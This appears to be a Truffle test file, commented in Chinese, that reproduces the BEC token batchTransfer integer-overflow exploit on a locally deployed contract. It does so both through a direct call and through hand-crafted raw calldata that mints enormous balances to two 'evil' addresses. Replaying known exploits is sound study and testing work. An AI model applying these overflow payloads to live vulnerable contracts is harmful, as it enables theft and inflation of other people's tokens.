require('chai')
    .use(require('chai-as-promised'))
    .use(require('chai-bignumber')(web3.BigNumber))
    .should()

var BecToken = artifacts.require('BecToken.sol');

/**
 * @dev BEC-Token漏洞实际攻击链接：https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f
 */

/**
 * @dev uint256溢出原理
 * 
 * uint256表示数据范围：0 ~ 2^256-1，即0x00-0xFF...FF (32对FF)
 */
let STR0X = "0x";
let SPLong = "          ";
let SPMid = "     ";

let evilAccounts0 = "0000000000000000000000000000000000000001"; // 恶意地址1
let evilAccounts1 = "0000000000000000000000000000000000000002"; // 恶意地址2

let evilNumberStr = "8000000000000000000000000000000000000000000000000000000000000000"; // x2 = 2^256

let evilNumber = new web3.BigNumber(STR0X + evilNumberStr);

contract('BEC-Token溢出漏洞重放', function ([owner]) {
    let token;
    let ret;
    let seq = 0;

    /// @dev 每个case使用全新的bec合约
    beforeEach(async function () {
        token = await BecToken.new({
            from: owner
        });
        seq++;
        console.log(SPMid, "Case:", seq, "New contract address:", token.address);
    });

    it('Case @ should have correct information', async function () {
        console.log(SPLong, 'Owner:', owner);
        console.log(SPLong, "Evil Address 1", STR0X + evilAccounts0);
        console.log(SPLong, "Evil Address 2", STR0X + evilAccounts1);

        const decimals = await token.decimals();
        const name = await token.name();
        const symbol = await token.symbol();
        const totalSupply = await token.totalSupply();
        decimals.should.be.bignumber.equal(18);
        name.should.equal('BeautyChain');
        totalSupply.should.be.bignumber.equal(7e+27);
    });
    
    it('Case @ batchTransfer 攻击方法 1)', async function () {
        ret = await token.balanceOf(STR0X + evilAccounts0);
        assert.equal(ret.valueOf(), 0, "检查攻击前账户0的余额");
        
        ret = await token.balanceOf(STR0X + evilAccounts1);
        console.log(SPLong, "balanceOf(", STR0X + evilAccounts0, ").toFix(0)    ", ret.toFixed(0));
        assert.equal(ret.valueOf(), 0, "检查攻击前账户1的余额");

        /// @dev 开始实施溢出攻击
        await token.batchTransfer([STR0X + evilAccounts0, STR0X + evilAccounts1], evilNumber, {
            from: owner
        });
        ret = await token.balanceOf(STR0X + evilAccounts0);
        console.log(SPLong, "balanceOf(", STR0X + evilAccounts1, ").toString(10)", ret.toString(10));
        console.log(SPLong, "balanceOf(", STR0X + evilAccounts1, ").toString(16)", ret.toString(16));
        ret.should.be.bignumber.equal(evilNumber); // 校验攻击后余额
    });

    it('case @ batchTransfer 攻击方法 2):', async function () {
        ret = await token.balanceOf(STR0X + evilAccounts0);
        assert.equal(ret.valueOf(), 0, "检查攻击前账户0的余额");
        
        ret = await token.balanceOf(STR0X + evilAccounts1);
        assert.equal(ret.valueOf(), 0, "检查攻击前账户1的余额");

        /**
         * databyte详解：http://me.tryblockchain.org/Solidity-abi-abstraction.html
         * 
         * contract内使用bytes4(keccak256("foo(uint32,bool)"))
         */
        let data =
            "0x" +  // 十六进制前缀
            "83f12fec" + // web3.sha3("batchTransfer(address[],uint256)") = "0x83f12fec3f826b81990730d367db2ee2bf6a5c6f782f6c3d58796f35967c2349"
            /// @dev 以下每行64个字节的十六进制字符代表实际32个字节的数据, 4*32=128(0x80)
            "0000000000000000000000000000000000000000000000000000000000000040" + // 第一个参数address[]的偏移值
            "8000000000000000000000000000000000000000000000000000000000000000" + // 第二个参数
            "0000000000000000000000000000000000000000000000000000000000000002" + // 第一个参数[]的长度
            "000000000000000000000000" + evilAccounts0 +                         // 第一个参数的第0个元素
            "000000000000000000000000" + evilAccounts1;                          // 第二个参数的第1个元素

        /// @dev 开始实施溢出攻击
        let result = await web3.eth.sendTransaction({
            from: owner,
            gasPrice: 1,
            gas: 470000,
            to: token.address,
            data: data
        });
        console.log(SPLong, "TxHash:", result);


        ret = await token.balanceOf(STR0X + evilAccounts0);   
        ret.should.be.bignumber.equal(evilNumber); // 校验攻击后账户0的余额

        ret = await token.balanceOf(STR0X + evilAccounts1); // bec的类型为BigNumber
        ret.should.be.bignumber.equal(evilNumber); // 校验攻击后账户1余额
    });
});